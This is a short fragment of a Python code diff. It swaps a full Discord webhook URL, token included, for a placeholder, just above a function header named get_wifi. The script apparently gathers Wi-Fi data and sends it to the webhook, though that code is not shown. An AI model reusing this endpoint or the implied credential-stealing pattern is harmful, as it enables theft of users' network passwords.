@@ -7,7 +7,7 @@ import subprocess
 import requests
 
 
-WEBHOOK = "https://discord.com/api/webhooks/1052265255356596284/xg2jeQNwX5XSmcnouqjuKTbKvPocJtiunVf-W2G5YqIiLrFDQIBp7xuQoysHdE_ONnut"
+WEBHOOK = "x"
 
 def get_wifi():
     global result,output,lines
